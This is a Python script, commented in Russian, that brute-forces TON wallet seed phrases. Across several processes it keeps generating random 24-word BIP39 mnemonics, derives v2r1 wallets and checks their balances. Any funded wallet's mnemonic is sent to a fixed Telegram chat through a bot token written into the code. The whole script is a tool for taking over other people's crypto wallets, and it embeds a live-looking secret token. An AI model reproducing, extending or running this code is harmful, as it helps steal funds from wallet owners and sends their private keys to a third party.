from tonsdk.contract.wallet import Wallets, WalletVersionEnum

import multiprocessing
import telebot
import json
import time
import pandas as pd
import random
from utils import get_balance
from db import *
import warnings

warnings.filterwarnings('ignore')


# Инициализация Telegram бота
bot = telebot.TeleBot(token='5387358716:AAGBJ08tsDxHjQgL2oR-ZXhG2sP9ruxr3E4')  # Замените на ваш токен

# Загрузка BIP39 словаря
bip39 = pd.read_excel('bip39.xlsx')['#'].to_list()

# Список поддерживаемых версий кошельков
WALLET_VERSIONS = [1, 2, 3, 4, 5]  # Добавьте другие версии при необходимости

def main(mnemonic: list = None):
    count = 0

    while True:
        balance = 0
        mnemonic = random.choices(bip39, k=24)

        # for version in [WalletVersionEnum.v2r1, WalletVersionEnum.v2r2,
        #                 WalletVersionEnum.v3r1, WalletVersionEnum.v3r2, 
        #                 WalletVersionEnum.v4r1, WalletVersionEnum.v4r2, 
        #                 WalletVersionEnum.hv2]:
        for version in ['v2r1']:
            mnemonic, pub_k, priv_k, wallet = Wallets.from_mnemonics(version=version, mnemonics=mnemonic, workchain=0)
            try:
                mnemonic, pub_k, priv_k, wallet = Wallets.from_mnemonics(version=version, mnemonics=mnemonic, workchain=0)
                
                wallet1 = wallet.address.to_string()
                wallet2 = wallet.address.to_string(1, 1, 1, 1)

                # Проверка баланса кошелька
                try:
                    balance = float(get_balance(wallet1)['balance']) / 10**9
                except KeyError:
                    balance = 0  # Если баланс не найден, считать его нулевым

                if balance > 0:
                    message = f'''Версия кошелька: V{version}\nМнемоника:\n{' '.join(mnemonic)}\n\nБаланс: {balance} TON'''
                    print(f"Версия: V{version}\nМнемоника: {' '.join(mnemonic)}\nАдрес: {wallet1}\nБаланс: {balance} TON\n")
                    
                    # Отправка сообщения в Telegram
                    bot.send_message(chat_id=918415013, text=message)  # Замените chat_id на ваш

                    # Запись данных в базу
                    # add_data(balance, wallet1, mnemonic, version=version)


            except Exception as e:
                print(f"Ошибка при обработке версии {version}: {e}")
                continue  # Продолжить с следующей версией

        count += 1
        if count % 1000 == 0:
            print(f"Проверено {count} мнемоник.")

if __name__ == '__main__':
    n_proc = max(multiprocessing.cpu_count() - 2, 1)  # Оставляем 2 ядра свободными
    processes = []

    for i in range(n_proc):
        process = multiprocessing.Process(target=main)
        process.start()
        processes.append(process)

    for process in processes:
        process.join()
